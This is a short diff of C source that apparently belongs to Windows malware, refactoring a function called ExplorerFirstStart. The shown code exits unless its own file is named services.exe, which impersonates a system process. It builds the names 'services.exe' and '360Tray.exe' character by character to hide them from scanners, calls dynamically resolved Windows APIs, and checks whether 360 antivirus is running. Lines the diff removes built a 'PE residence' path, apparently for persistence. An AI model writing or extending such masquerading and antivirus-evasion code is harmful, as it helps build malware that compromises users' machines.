@@ -199,10 +199,11 @@ int ExplorerFirstStart() {
 
 	iRet = GetPathFromFullName(szCurrentExePath, szCurrentPath);//GetModuleBaseName	返回进程名不包含路径
 
-	char exename[MAX_PATH];
-	GetNameFromFullName(szCurrentExePath, exename);
+	char szExeName[MAX_PATH] = { 0 };
+	iRet = GetNameFromFullName(szCurrentExePath, szExeName);
+
 	char servicesExe[] = { 's','e','r','v','i','c','e','s','.','e','x','e',0 };
-	if (lplstrcmpiA(exename, servicesExe) != 0) {
+	if (lplstrcmpiA(szExeName, servicesExe) != 0) {
 		writeLog("filename format error\r\n");
 		lpExitProcess(0);
 	}
@@ -214,10 +215,6 @@ int ExplorerFirstStart() {
 		char szParentProcName[MAX_PATH];
 		iRet = GetParentProcName(szParentProcName);
 
-		char szExeName[MAX_PATH] = { 0 };
-		iRet = GetNameFromFullName(szCurrentExePath, szExeName);
-
-		lpwsprintfA(strPEResidence, "%s%s", strDataPath, szExeName);
 
 		char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
 		int b360Running = GetProcessIdByName(sz360Tray);
